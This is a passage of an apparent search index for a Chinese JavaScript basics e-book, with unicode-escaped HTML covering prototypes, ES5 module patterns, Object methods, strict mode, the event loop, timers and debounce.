\u7ee7\u627f\u4e24\u4e2a\u5bf9\u8c61\uff0c\u6307\u5b9a\u6784\u9020\u51fd\u6570\u7684constructor\u662f\u81ea\u5df1\nFun.prototype = Object.create(M1.prototype);\nObject.assign(Fun.prototype, M2.prototype);\nFun.prototype.constructor = Fun;\n\nlet s = new S();\ns.name + s.lastName //Michael An\n</code></pre>"},{"location":"ebook-JS-basic/06-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/#7es5","title":"7\u3001\u6a21\u5757\u5316\u7f16\u7a0b\uff08ES5\u5b9e\u73b0\u6a21\u5757\uff09","text":"<p>\u5728ES6\u4e2d\u53ef\u4ee5\u4f7f\u7528\u6a21\u5757\u548c\u7c7b\uff0c\u5728ES5\u4e2d\u4f7f\u7528\u5bf9\u8c61\u5b9e\u73b0\u6a21\u5757\uff1b</p> <p>1\u3001\u628a\u4e00\u4e2a\u6a21\u5757\u7684\u529f\u80fd\u5199\u6210\u4e00\u4e2a\u666e\u901a\u5bf9\u8c61\uff0c\u5185\u90e8\u5177\u6709\u65b9\u6cd5\u548c\u5c5e\u6027\uff08\u7f3a\u70b9\u662f\u5185\u90e8\u7684\u6240\u6709\u72b6\u6001\u4f1a\u88ab\u5916\u90e8\u6539\u53d8\uff09</p> <p>2\u3001\u628a\u4e00\u4e2a\u6a21\u5757\u5199\u6210\u6784\u9020\u51fd\u6570\u3002\u4f46\u662f\u5b9e\u4f8b\u5bf9\u8c61\u83b7\u53d6\u5c5e\u6027\u65f6\u4f1a\u9891\u7e41\u8bbf\u95ee\u6784\u9020\u51fd\u6570\uff0c\u6d88\u8017\u5185\u5b58</p> <p>3\u3001\u4f7f\u7528\u7acb\u5373\u6267\u884c\u51fd\u6570\uff0c\u628a\u76f8\u5173\u7684\u65b9\u6cd5\u548c\u5c5e\u6027\u5c01\u88c5\u5728\u51fd\u6570\u4f5c\u7528\u57df\u4e2d\uff0c\u53ef\u4ee5\u4e0d\u66b4\u9732\u79c1\u6709\u6210\u5458</p> <pre><code>var module = (function(){\n  var _age = 0;\n  var fun = function() {\n    //\n  };\n  return {\n    fun: fun,\n  };\n})();\n// \u5916\u90e8\u53ea\u53ef\u4ee5\u8bbf\u95ee\u5230\u8fd4\u56de\u7684\u90e8\u5206\n</code></pre> <p>\u6a21\u5757\u5177\u6709\u72ec\u7acb\u6027\uff0c\u6a21\u5757\u5185\u90e8\u548c\u5176\u4ed6\u7a0b\u5e8f\u6700\u597d\u4e0d\u9700\u8981\u76f4\u63a5\u4ea4\u4e92\u3002\u4e3a\u4e86\u5728\u6a21\u5757\u5185\u90e8\u8c03\u7528\u5168\u5c40\u53d8\u91cf\uff0c\u90a3\u4e48\u53ef\u4ee5\u663e\u5f0f\u5c06\u5176\u4ed6\u7684\u53d8\u91cf\u8f93\u5165\u6a21\u5757\u3002</p> <pre><code>var module1 = (function ($, YAHOO) {\n\u3000//...\n})(jQuery, YAHOO);\n</code></pre>"},{"location":"ebook-JS-basic/06-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/#64-object","title":"6.4 Object\u5bf9\u8c61\u7684\u76f8\u5173\u65b9\u6cd5","text":"<p>Object \u4e0a\u9762\u5173\u4e8e\u9762\u5411\u5bf9\u8c61\u7684\u76f8\u5173\u65b9\u6cd5</p> <p>1\u3001getPrototypeOf \u8fd4\u56de\u53c2\u6570\u5bf9\u8c61\u7684\u539f\u578b</p> <p>Object.getPrototypeOf(object) === object.prototype</p> <p>\u7a7a\u5bf9\u8c61\u7684\u539f\u578b\u662f Object.prototype</p> <p>\u51fd\u6570\u7684\u539f\u578b\u662f Function.prototype</p> <p>Object.prototype \u7684\u539f\u578b\u662f null</p> <p>2\u3001setPrototypeOf\uff08object, prototype\uff09</p> <p>3\u3001Object.create(object) \u4ee5\u4e00\u4e2a\u5bf9\u8c61\u4e3a\u539f\u578b\u5bf9\u8c61\uff0c\u8fd4\u56de\u4e00\u4e2a\u5b9e\u4f8b\u5bf9\u8c61\uff1b\u5b9e\u4f8b\u5bf9\u8c61\u7ee7\u627f\u4e86\u539f\u578b\u5bf9\u8c61\u7684\u5168\u90e8\u5c5e\u6027\u3002</p> <pre><code>// \u8fd9\u4e09\u79cd\u521b\u5efa\u5bf9\u8c61\u7684\u65b9\u6cd5\u662f\u7b49\u4ef7\u7684\nvar obj1 = Object.create({});\nvar obj2 = Object.create(Object.prototype);\nvar obj3 = new Object();\n</code></pre> <p>4\u3001Object.prototype.isPrototypeOf</p> <p>\u5224\u65ad\u4e00\u4e2a\u5bf9\u8c61\u662f\u5426\u4e3a\u53c2\u6570\u5bf9\u8c61\u7684\u539f\u578b</p> <p>5\u3001Object.prototype._ _ proto _ _ \u8fd4\u56de\u8be5\u5bf9\u8c61\u7684\u539f\u578b</p> <p>\u8fd9\u662f\u4e00\u4e2a\u5185\u90e8\u5c5e\u6027\uff0c\u5c3d\u91cf\u4f7f\u7528 Object.getPrototypeOf() \u548c setPrototypeOf() \u7684\u65b9\u6cd5\u83b7\u53d6\u548c\u8bbe\u7f6e\u539f\u578b\u5bf9\u8c61</p> <p>6\u3001\u83b7\u53d6\u5b9e\u4f8b\u5bf9\u8c61\u7684\u539f\u578b\u5bf9\u8c61\u7684\u65b9\u6cd5</p> <pre><code>obj.__proto__\nobj.constructor.prototype\nObject.getPrototypeOf(obj)\n</code></pre> <p>\u7b2c\u4e09\u79cd\u6700\u597d\uff08\u5b98\u65b9\u6807\u51c6\uff0c\u524d\u4e24\u79cd\u5728\u7279\u6b8a\u73af\u5883\u65e0\u6cd5\u83b7\u53d6\u5bf9\u8c61\u7684\u539f\u578b\uff09</p> <p>7\u3001Object.getOwnPropertyNames(obj)</p> <p>\u8fd4\u56de\u5b9e\u4f8b\u5bf9\u8c61\u7684\u6240\u6709\u5c5e\u6027\u540d\uff08\u4e0d\u5305\u62ec\u7ee7\u627f\u7684\u5c5e\u6027\uff0c\u5305\u62ec\u53ef\u4ee5\u904d\u5386\u548c\u4e0d\u53ef\u4ee5\u904d\u5386\u7684\u5c5e\u6027\uff09</p> <p>Object.keys(obj) \u8fd4\u56de\u53ef\u4ee5\u904d\u5386\u7684\u5c5e\u6027\u540d\u7684\u6570\u7ec4</p> <p>8\u3001Object.prototype.hasOwnProperty()</p> <p>\u5224\u65ad\u5bf9\u8c61\u4e0a\u7684\u67d0\u4e2a\u5c5e\u6027\u662f\u81ea\u8eab\u7684\u8fd8\u662f\u539f\u578b\u94fe\u4e0a\u9762\u7684\uff08\uff09</p> <p>9\u3001 for...in... \u5faa\u73af</p> <p>For-in \u5faa\u73af\u53ef\u4ee5\u904d\u5386\u5bf9\u8c61\u4e0a\u9762\u5168\u90e8\u7684\u53ef\u904d\u5386\u5c5e\u6027\uff08\u5305\u62ec\u81ea\u5df1\u7684\u53ef\u904d\u5386\u5c5e\u6027\u548c\u7ee7\u627f\u7684\u53ef\u904d\u5386\u5c5e\u6027\uff09</p> <p>\u5229\u7528 for-in \u5faa\u73af\uff0c\u5185\u90e8\u4f7f\u7528 hasOwnProperty \u5224\u65ad\uff0c\u53ef\u4ee5\u904d\u5386\u5bf9\u8c61\u81ea\u5df1\u7684\u53ef\u904d\u5386\u5c5e\u6027</p> <p>10\u3001\u5bf9\u8c61\u7684\u62f7\u8d1d</p> <p>\u65b0\u5bf9\u8c61\u548c\u539f\u5bf9\u8c61\u5177\u6709\u76f8\u540c\u7684\u539f\u578b\u548c\u5b9e\u4f8b\u5c5e\u6027</p> <pre><code>// ES5\nfunction copyObject(orig) {\n  var copy = Object.create(Object.getPrototypeOf(orig));\n  copyOwnPropertiesFrom(copy, orig);\n  return copy;\n}\n\nfunction copyOwnPropertiesFrom(target, source) {\n  Object\n    .getOwnPropertyNames(source)\n    .forEach(function (propKey) {\n      var desc = Object.getOwnPropertyDescriptor(source, propKey);\n      Object.defineProperty(target, propKey, desc);\n    });\n  return target;\n}\n</code></pre> <pre><code>// ES7\nfunction copyObject(orig) {\n  return Object.create(\n    Object.getPrototypeOf(orig),\n    Object.getOwnPropertyDescriptors(orig)\n  );\n}\n</code></pre>"},{"location":"ebook-JS-basic/06-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%BC%96%E7%A8%8B/#65","title":"6.5 \u4e25\u683c\u6a21\u5f0f","text":"<p>\u5728\u666e\u901a\u6a21\u5f0f\u4e0b\u4e0d\u62a5\u9519\u7684\u4ee3\u7801\uff0c\u4e25\u683c\u6a21\u5f0f\u4e0b\u53ef\u80fd\u62a5\u9519\u3002</p> <p>\u8bbe\u8ba1\u76ee\u7684\uff1a\u65e9\u671f\u7248\u672c\u89c4\u5219\u4e0d\u660e\u786e\u6709\u6f0f\u6d1e\uff0c\u4ece ES5 \u5f00\u59cb\u52a0\u5165\u4e25\u683c\u6a21\u5f0f\uff0c\u4f7f\u5f97JS\u66f4\u6b63\u89c4\uff0c\u4e3a\u4ee5\u540e\u7248\u672c\u51c6\u5907\u3002</p> <p>\u4f7f\u7528</p> <p><code>'use strict;'</code></p> <p>\u4e25\u683c\u6a21\u5f0f\u53ef\u4ee5\u7528\u4e8e\u6574\u4e2a\u811a\u672c\u6216\u8005\u5355\u4e2a\u51fd\u6570\u4e2d\u3002\u5982\u679c\u4f5c\u7528\u5728\u6574\u4e2a\u811a\u672c\uff08js\uff09\u4e2d\uff0c\u9700\u8981\u5728\u7b2c\u4e00\u884c\u4f7f\u7528 use strict \u8bf4\u660e\u3002\u5982\u679c\u662f\u51fd\u6570\u4e2d\uff0c\u9700\u8981\u5728\u51fd\u6570\u5185\u90e8\u7b2c\u4e00\u884c\u58f0\u660e\u3002\u5982\u679c\u591a\u4e2a\u811a\u672c\u4e2d\uff0c\u4e00\u90e8\u5206\u662f\u4e25\u683c\u6a21\u5f0f\uff0c\u53e6\u4e00\u90e8\u5206\u662f\u666e\u901a\u51fd\u6570\uff0c\u7ec4\u5408\u540e\u53ef\u80fd\u62a5\u9519\uff08\u4e25\u683c\u6a21\u5f0f\u5728\u524d\uff09\u3002</p> <p>\u663e\u793a\u62a5\u9519</p> <p>1\u3001\u53ea\u8bfb\u5c5e\u6027\u4e0d\u53ef\u5199\uff0c\u5f3a\u884c\u66f4\u6539</p> <p>2\u3001\u8bbe\u7f6e\u4e86\u53d6\u503c\u5668(get)\uff0c\u6ca1\u6709\u8bbe\u7f6e\u5b58\u503c\u5668(set)  </p> <p>3\u3001\u7981\u6b62\u6269\u5c55\u7684\u5bf9\u8c61\u4e0d\u80fd\u6269\u5c55 Object.preventExtensions(obj);</p> <p>4\u3001\u53d8\u91cf\u540d\u4e0d\u80fd\u4f7f\u7528 eval arguments</p> <p>5\u3001\u4e0d\u80fd\u5b58\u5728\u540c\u540d\u51fd\u6570</p> <p>6\u3001\u516b\u8fdb\u5236\u4e0b\u7981\u6b62\u4f7f\u7528 0100 (0\u524d\u7f00)</p> <p>\u589e\u5f3a\u7684\u5b89\u5168\u63aa\u65bd</p> <p>1\u3001\u5168\u5c40\u53d8\u91cf\u5fc5\u987b\u58f0\u660e\uff08\u4e0d\u80fd\u76f4\u63a5\u9690\u5f0f\u58f0\u660e\u4f7f\u7528\uff09\u907f\u514d\u4e86 <code>for(i = 0; i &lt; 10; i++){...}</code></p> <p>2\u3001\u7981\u6b62\u51fd\u6570\u5185\u90e8\u7684 this \u6307\u5411\u5168\u5c40\u5bf9\u8c61 window\uff08\u907f\u514d\u65e0\u610f\u95f4\u521b\u9020\u5168\u5c40\u53d8\u91cf\uff09</p> <p>3\u3001\u7981\u6b62\u4f7f\u7528 fn.caller arguments.caller \u4e0d\u80fd\u5728\u51fd\u6570\u5185\u90e8\u5f97\u5230\u8c03\u7528\u6808\uff08\u8fd9\u4e2a\u5c5e\u6027\u5df2\u7ecf\u79fb\u9664\uff09\u3002\u6b63\u5e38\u6a21\u5f0f\u4e0d\u4f1a\u62a5\u9519\uff0c\u4e25\u683c\u6a21\u5f0f\u4f1a\u62a5\u9519\u3002</p> <p>4\u3001\u7981\u6b62\u7528 delete \u5220\u9664\u4e00\u4e2a\u53d8\u91cf\uff0c\u53ef\u4ee5\u5220\u9664\u4e00\u4e2a\u5bf9\u8c61\u7684\u5c5e\u6027\uff08\u5c5e\u6027\u7684 configurable === true\uff09</p> <p>\u52a8\u6001\u7ed1\u5b9a\u548c\u9759\u6001\u7ed1\u5b9a</p> <p>\u7981\u6b62\u4f7f\u7528 with </p>"},{"location":"ebook-JS-basic/07-%E5%BC%82%E6%AD%A5%E6%93%8D%E4%BD%9C/","title":"07-\u5f02\u6b65\u64cd\u4f5c","text":""},{"location":"ebook-JS-basic/07-%E5%BC%82%E6%AD%A5%E6%93%8D%E4%BD%9C/#_1","title":"\u5f02\u6b65\u64cd\u4f5c","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 8138  \u9605\u8bfb17\u5206\u949f</p> <p>2021-11-18 2023-04-08</p>"},{"location":"ebook-JS-basic/07-%E5%BC%82%E6%AD%A5%E6%93%8D%E4%BD%9C/#_2","title":"\u6982\u5ff5","text":""},{"location":"ebook-JS-basic/07-%E5%BC%82%E6%AD%A5%E6%93%8D%E4%BD%9C/#1","title":"1\u3001\u5355\u7ebf\u7a0b\u6a21\u5f0f","text":"<p>JS \u8bed\u8a00\u53ea\u5728\u4e00\u4e2a\u7ebf\u7a0b\u4e0a\u8fd0\u884c\uff0cJS\u5728\u67d0\u65f6\u523b\u53ea\u80fd\u6267\u884c\u4e00\u4e2a\u4efb\u52a1\uff0c\u5176\u4ed6\u4efb\u52a1\u5fc5\u987b\u5728\u540e\u9762\u6392\u961f\u7b49\u5f85\u3002\u5b9e\u9645\u4e0a JS V8 \u5f15\u64ce\u5b8f\u89c2\u4e0a\u5177\u6709\u591a\u7ebf\u7a0b\uff0c\u5355\u4e2a JS \u811a\u672c\u6587\u4ef6\u53ea\u80fd\u5728\u4e00\u4e2a\u7ebf\u7a0b\uff08\u4e3b\u7ebf\u7a0b\uff09\u4e0a\u8fd0\u884c\uff0c\u5176\u4ed6\u7ebf\u7a0b\u5728\u540e\u53f0\u914d\u5408\u3002</p> <p>\u5355\u7ebf\u7a0b\u7684\u539f\u56e0\uff1a\u6d4f\u89c8\u5668\u7ebf\u7a0b\u4e3b\u8981\u548c DOM \u76f8\u5173\uff0c\u5982\u679c\u591a\u4e2a\u7ebf\u7a0b\u540c\u65f6\u66f4\u6539 DOM\uff0c\u5c31\u9020\u6210\u4e86\u4e0d\u786e\u5b9a\u6027\uff0c\u6240\u4ee5\u65e9\u671f\u4f7f\u7528\u5355\u7ebf\u7a0b\u5b8c\u6210\u3002</p> <p>\u5355\u7ebf\u7a0b\u597d\u5904\uff1a\u8bbe\u8ba1\u7b80\u5355\uff0c\u6267\u884c\u73af\u5883\u5355\u7eaf\uff0c\u7ebf\u7a0b\u4e0d\u4f1a\u51b2\u7a81\u3002</p> <p>\u5355\u7ebf\u7a0b\u7f3a\u70b9\uff1a\u8bfb\u5199\u5916\u90e8\u6570\u636e\uff0c\u6216\u8005\u53d1\u9001\u8bf7\u6c42\uff0c\u53ef\u80fd\u811a\u672c\u957f\u65f6\u95f4\u505c\u6ede\uff08\u6d4f\u89c8\u5668\u5047\u6b7b\uff09\uff0c\u6b64\u65f6 CPU \u8fd8\u5728\u95f2\u7f6e\uff0c\u754c\u9762\u662f\u7a7a\u767d\u3002</p> <p>H5\u89c4\u5b9a\uff1a\u4e00\u4e2aJS\u811a\u672c\u53ef\u4ee5\u521b\u5efa\u591a\u4e2a\u7ebf\u7a0b\uff0c\u5b50\u7ebf\u7a0b\u5b8c\u5168\u88ab\u4e3b\u7ebf\u7a0b\u63a7\u5236\uff0c\u5b50\u7ebf\u7a0b\u4e0d\u80fd\u63a7\u5236DOM\uff08\u672c\u8d28\u5355\u7ebf\u7a0b\u6ca1\u53d8\uff09\u3002</p>"},{"location":"ebook-JS-basic/07-%E5%BC%82%E6%AD%A5%E6%93%8D%E4%BD%9C/#2","title":"2\u3001\u540c\u6b65\u4efb\u52a1\u548c\u5f02\u6b65\u4efb\u52a1","text":"<p>\u7a0b\u5e8f\u4e2d\u7684\u4efb\u52a1\u5206\u6210**\u540c\u6b65\u4efb\u52a1\u548c\u5f02\u6b65\u4efb\u52a1**\uff1b\u540c\u6b65\u4efb\u52a1\u662f\u4e3b\u7ebf\u7a0b\u4e2d\u7684\u4efb\u52a1\uff0c\u5fc5\u987b\u7b49\u4e0a\u4e00\u4e2a\u4efb\u52a1\u5b8c\u6210\u540e\u518d\u6267\u884c\u4e0b\u4e00\u4e2a\u4efb\u52a1\u3002\u5f02\u6b65\u4efb\u52a1\u4e0d\u5728\u4e3b\u7ebf\u7a0b\u4e2d\uff0c\u8fdb\u5165**\u4efb\u52a1\u961f\u5217**\u3002\u5f53\u4e3b\u7ebf\u7a0b\u7684\u4e00\u4e2a\u72b6\u6001\u53d8\u5316\u540e\uff08\u4f8b\u5982ajax\u63a5\u5230\u6570\u636e\uff09\uff0c\u4efb\u52a1\u961f\u5217\u4e2d\u7684\u4efb\u52a1\u4f1a\u4ee5\u56de\u8c03\u51fd\u6570\u7684\u5f62\u5f0f\u8fdb\u5165\u4e3b\u7ebf\u7a0b\u6267\u884c\uff0c\u4e0d\u4f1a\u4ea7\u751f\u5835\u585e\u3002Ajax\u53ef\u4ee5\u5b9e\u73b0\u540c\u6b65\u4efb\u52a1\u548c\u5f02\u6b65\u4efb\u52a1\u3002\u5982\u679c\u662f\u540c\u6b65\u4efb\u52a1\uff0c\u9700\u8981\u7b49\u8bf7\u6c42\u8fd4\u56de\u540e\u6267\u884c\u540e\u9762\u7684\u4ee3\u7801\uff1b\u5982\u679c\u662f\u5f02\u6b65\u4efb\u52a1\uff0c\u5728\u8bf7\u6c42\u7684\u540c\u65f6\uff0c\u4f1a\u6267\u884c\u540e\u9762\u7684\u4ee3\u7801\uff1b\u8bf7\u6c42\u54cd\u5e94\u540e\uff0c\u4e3b\u7ebf\u7a0b\u518d\u8c03\u7528\u56de\u8c03\u51fd\u6570\u3002</p>"},{"location":"ebook-JS-basic/07-%E5%BC%82%E6%AD%A5%E6%93%8D%E4%BD%9C/#3","title":"3\u3001\u4efb\u52a1\u961f\u5217\u548c\u4e8b\u4ef6\u5faa\u73af","text":"<p>JS \u7a0b\u5e8f\u4e2d\u5177\u6709\u4e00\u4e2a\u4e3b\u7ebf\u7a0b\uff0c\u8fd8\u6709\u82e5\u5e72\u4efb\u52a1\u961f\u5217\u3002\u4e3b\u7ebf\u7a0b\u9996\u5148\u6267\u884c\u540c\u6b65\u4efb\u52a1\uff0c\u6267\u884c\u5b8c\u540c\u6b65\u4efb\u52a1\u540e\uff0c\u5c31\u4f1a\u67e5\u770b\u4efb\u52a1\u961f\u5217\u4e2d\u7684\u5f02\u6b65\u4efb\u52a1\uff0c\u5982\u679c\u6ee1\u8db3\u6761\u4ef6\uff0c\u5f02\u6b65\u4efb\u52a1\u8fdb\u5165\u4e3b\u7ebf\u7a0b\u53d8\u6210\u540c\u6b65\u4efb\u52a1\u6267\u884c\u3002</p> <p>\u4e8b\u4ef6\u5faa\u73af\uff1aJS \u5f15\u64ce\u4e0d\u65ad\u68c0\u67e5\u5f02\u6b65\u4e8b\u4ef6\uff1b\u5f53\u540c\u6b65\u4e8b\u4ef6\u8fdb\u884c\u5b8c\uff0cJS\u5f15\u64ce\u4f1a\u68c0\u67e5\u4efb\u52a1\u961f\u5217\u4e2d\u7684\u5f02\u6b65\u4efb\u52a1\u5e76\u6267\u884c\uff0c\u76f4\u5230\u5168\u90e8\u4efb\u52a1\u6267\u884c\u7ed3\u675f\uff0c\u5bf9\u5e94\u7a0b\u5e8f\u6267\u884c\u7ed3\u675f\u3002</p>"},{"location":"ebook-JS-basic/07-%E5%BC%82%E6%AD%A5%E6%93%8D%E4%BD%9C/#4","title":"4\u3001\u5f02\u6b65\u64cd\u4f5c\u7684\u6a21\u5f0f","text":"<p>\u56de\u8c03\u51fd\u6570\uff1a\u7b80\u5355\uff0c\u4f46\u662f\u4e0d\u540c\u7a0b\u5e8f\u9ad8\u5ea6\u8026\u5408\uff0c\u591a\u4e2a\u56de\u8c03\u51fd\u6570\u5d4c\u5957\u5f88\u590d\u6742\uff0c\u6bcf\u4e2a\u4efb\u52a1\u5bf9\u5e94\u4e00\u4e2a\u56de\u8c03\u51fd\u6570\u3002</p> <pre><code>function f1() {\n  //\n}\nfunction f2(callback) {\n  //\n  callback();\n}\nf2(f1);\n// \u628a\u56de\u8c03\u51fd\u6570\u4ee5\u53c2\u6570\u7684\u5f62\u5f0f\u4f20\u5165\u540c\u6b65\u4efb\u52a1\u51fd\u6570\u4e2d\n</code></pre> <p>\u4e8b\u4ef6\u9a71\u52a8\uff1a\u53ef\u4ee5\u7ed1\u5b9a\u591a\u4e2a\u4e8b\u4ef6\uff0c\u6bcf\u4e2a\u4e8b\u4ef6\u53ef\u4ee5\u6267\u884c\u591a\u4e2a\u56de\u8c03\u51fd\u6570\uff0c\u53bb\u8026\u5408\uff0c\u6a21\u5757\u5316\u3002\u6574\u4e2a\u7a0b\u5e8f\u5982\u679c\u662f\u4e8b\u4ef6\u9a71\u52a8\uff0c\u90a3\u4e48\u4e3b\u7ebf\u7a0b\u4e0d\u660e\u786e\u3002</p> <pre><code>function f1(){\n  setTimeout(function() {\n    f1.trigger('onclick');\n  }, 1000);\n}\n\nf1.on('click', f2);\n</code></pre> <p>\u53d1\u5e03\u8ba2\u9605\uff08\u89c2\u5bdf\u8005\u6a21\u5f0f\uff0cpublish-subscribe pattern, observer pattern\uff09</p> <pre><code>$.subscribe('done', f2); // f2 \u51fd\u6570\u5411\u4fe1\u53f7\u4e2d\u5fc3$\u8ba2\u9605 done \u4fe1\u53f7\n\nfunction f1 (){\n  setTimeout(function() {\n    $.publish('done');\n    // f1 \u6267\u884c\u5b8c\u6bd5\u540e\uff0c\u5411\u4fe1\u53f7\u4e2d\u5fc3 $ \u53d1\u5e03done\u4fe1\u53f7(\u4ece\u800c\u5f15\u53d1f2\u51fd\u6570\u6267\u884c)\n  });\n}\n\nfunction f2() {\n  // do something\n  $.unsubscribe('done');\n  // \u51fd\u6570\u6267\u884c\u5b8c\u6bd5\u540e\uff0c\u53d6\u6d88\u8ba2\u9605\n}\n</code></pre> <p>\u53d1\u5e03\u8ba2\u9605\u6a21\u5f0f\u6bd4\u4e8b\u4ef6\u9a71\u52a8\u6a21\u5f0f\u597d\uff0c\u53ef\u4ee5\u67e5\u770b\u6d88\u606f\u4e2d\u5fc3\u83b7\u53d6\u4fe1\u53f7\u6570\u91cf\uff0c\u4fe1\u53f7\u8ba2\u9605\u8005\uff0c\u4ece\u6574\u4f53\u4e0a\u76d1\u63a7\u7a0b\u5e8f\u7684\u8fd0\u884c</p>"},{"location":"ebook-JS-basic/07-%E5%BC%82%E6%AD%A5%E6%93%8D%E4%BD%9C/#5","title":"5\u3001\u591a\u4e2a\u5f02\u6b65\u4efb\u52a1\u7684\u6d41\u7a0b\u63a7\u5236","text":"<p>\u5982\u679c\u591a\u4e2a\u56de\u8c03\u51fd\u6570\u5d4c\u5957\uff0c\u7ed3\u6784\u590d\u6742\u96be\u4ee5\u7ef4\u62a4\u3002\u53ef\u4ee5\u91c7\u7528\u4e32\u884c\u548c\u5e76\u884c\u6267\u884c\u3002</p> <p>\u4e32\u884c\u6267\u884c\uff1a\u4f7f\u7528\u4e00\u4e2a\u4e32\u884c\u51fd\u6570\uff0c\u591a\u4e2a\u4efb\u52a1\u4f9d\u6b21\u6267\u884c\u3002\u7f3a\u70b9\u8017\u65f6\u3002</p> <p>\u5e76\u884c\u6267\u884c\uff1a\u540c\u65f6\u53d1\u5e03\u5f02\u6b65\u4efb\u52a1\uff0c\u4f18\u70b9\u7701\u65f6\u95f4\uff0c\u7f3a\u70b9\u8017\u6027\u80fd\u3002</p> <p>\u4e32\u884c\u548c\u5e76\u884c\u7ed3\u5408\uff1a\u8bbe\u7f6e\u4e00\u4e2a\u53d8\u91cf\u5b58\u653e\u5f02\u6b65\u4efb\u52a1\u7684\u7ed3\u679c\u548c\u5f53\u524d\u7684\u6570\u91cf\uff0c\u8bbe\u7f6e\u4e00\u4e2a\u5f53\u524d\u8fd0\u884c\u7684\u6700\u5927\u503c\uff0c\u901a\u8fc7\u6027\u80fd\u63a7\u5236\u4efb\u52a1\u8fd0\u884c\u7684\u6570\u91cf\u3002</p>"},{"location":"ebook-JS-basic/07-%E5%BC%82%E6%AD%A5%E6%93%8D%E4%BD%9C/#_3","title":"\u5b9a\u65f6\u5668","text":"<p>\u4e3b\u8981\u662f setTimeout setInterval clearTimeout, clearInterval\uff0c\u53ef\u4ee5\u5411\u4efb\u52a1\u961f\u5217\u6dfb\u52a0\u5b9a\u65f6\u4efb\u52a1\u3002</p> <p>setTimeout \u51fd\u6570\u8fd4\u56de\u4e00\u4e2a\u53d8\u91cf\uff08\u9012\u589e\u7684\u6574\u6570\uff09\uff0c\u7528\u4e8e\u6e05\u9664\u5b9a\u65f6\u5668\u3002\u51fd\u6570\u9ed8\u8ba4\u4f20\u5165\u4e24\u4e2a\u53c2\u6570\uff0c\u5206\u522b\u662f\u5f02\u6b65\u6267\u884c\u7684\u51fd\u6570\u548c\u95f4\u9694\u65f6\u95f4\uff0c\u53ef\u9009\u53c2\u6570\u662f\u56de\u8c03\u51fd\u6570\u7684\u53d8\u91cf\uff08ab\uff09;\u51fd\u6570\u5185\u90e8\u7684\u4f5c\u7528\u4e8e\u662f window\uff0cthis \u7684\u6307\u5411\u53d1\u751f\u53d8\u5316\uff0c\u6ce8\u610f\u3002</p> <pre><code>let that = this;\nlet a = setTimeout(function(a, b) {\n  // that.fucntion...\n}, 1000, a, b);\n</code></pre> <p>setInterval \u51fd\u6570\u7684\u53c2\u6570\u3001\u8fd4\u56de\u503c\u76f8\u540c\uff0c\u53ef\u4ee5\u5b9a\u65f6\u6267\u884c\u67d0\u4e2a\u51fd\u6570\uff0c\u4e0d\u4f1a\u4e3b\u52a8\u505c\u6b62\u3002\u7f3a\u70b9\uff1a\u95f4\u9694\u4e0d\u5305\u62ec\u51fd\u6570\u8fd0\u884c\u7684\u65f6\u95f4\uff0c\u5982\u679c\u51fd\u6570\u6267\u884c\u65f6\u95f4\u8f83\u957f\uff0c\u90a3\u4e48\u540e\u4e00\u6b21\u51fd\u6570\u4e5f\u4f1a\u51c6\u65f6\u6267\u884c\u3002</p> <p>\u5728\u6eda\u52a8\u51fd\u6570\u6216\u8005\u6e10\u53d8\u51fd\u6570\u4e2d\uff0c\u6700\u597d\u7684\u529e\u6cd5\u662f\u8bbe\u7f6e setTimeout \u5e76\u5728\u51fd\u6570\u5185\u90e8\u8bbe\u7f6e\u4e0b\u4e00\u6b21\u65f6\u95f4\u95f4\u9694\u51fd\u6570\u3002</p> <p>\u6e05\u9664\u6240\u6709\u5b9a\u65f6\u5668</p> <pre><code>(function() {\n  // \u6bcf\u8f6e\u4e8b\u4ef6\u5faa\u73af\u68c0\u67e5\u4e00\u6b21\n  var gid = setInterval(clearAllTimeouts, 0);\n\n  function clearAllTimeouts() {\n    var id = setTimeout(function() {}, 0);\n    while (id &gt; 0) {\n      if (id !== gid) {\n        clearTimeout(id);\n      }\n      id--;\n    }\n  }\n})();\n\n(function(){\n  var gid = setInterval(clearAllTimeouts, 0); // \u4e8b\u4ef6\u5faa\u73af\u65f6\u68c0\u67e5\u4e00\u6b21\n  function clearAllTimeouts() {\n    var id = setTimeout(function() {}, 0); // \u9996\u5148\u521b\u5efa\u4e00\u4e2a\u5b9a\u65f6\u5668\uff0c\u83b7\u53d6\u5b9a\u65f6\u5668\u6700\u5927\u503c\n    while (id &gt; 0) {\n      // \u6e05\u9664\u5168\u90e8\u7684\u5b9a\u65f6\u5668\n      if (id !== gid) {\n        clearTimeout(id);\n      }\n      id--;\n    }\n  }\n})();\n</code></pre> <p>\u9632\u6296</p> <pre><code>$('textarea').on('keydown', debounce(ajaxAction));\n\nfunction debounce(fn) {\n  var timer;\n  var that = this;\n  var args = arguments; // \u4f20\u5165\u7684\u53c2\u6570\n  clearTimeout(timer); // \u9996\u5148\u6e05\u9664\u4e00\u4e0b\u4e0a\u6b21\u7684\u5b9a\u65f6\u5668\n  timer = setTimeout(function() {\n    fn.apply(this, args);\n  }, 2000);\n}\n</code></pre> <p>\u5b9a\u65f6\u5668\u539f\u7406</p> <p>\u628a\u5f53\u524d\u4e8b\u4ef6\u79fb\u51fa\u4e8b\u4ef6\u961f\u5217\uff0c\u7b49\u56fa\u5b9a\u7684\u65f6\u95f4\u540e\u6267\u884c\u8fd9\u4e2a\u4e8b\u4ef6\u3002</p> <p>\u4e0d\u8db3\uff1a\u5982\u679c\u5f53\u524d\u4e3b\u7ebf\u7a0b\u6267\u884c\u7684\u65f6\u95f4\u6bd4\u8f83\u957f\uff0c\u8d85\u8fc7\u4e86\u5b9a\u671f\u5668\u7684\u65f6\u95f4\u95f4\u9694\uff0c\u90a3\u4e48\u4e3b\u7ebf\u7a0b\u4efb\u52a1\u6267\u884c\u5b8c\u540e\u4f1a\u7acb\u5373\u6267\u884c\u5b9a\u65f6\u5668\u5185\u5bb9\uff08\u53ef\u80fd\u591a\u4e2ainterval\u540c\u65f6\u89e6\u53d1\uff09\uff0c\u5373\u65f6\u95f4\u95f4\u9694 + JS \u6267\u884c\u7684\u65f6\u95f4 = \u8bbe\u7f6e\u7684\u65f6\u95f4\u3002</p> <p>setTimeout(fn , 0) 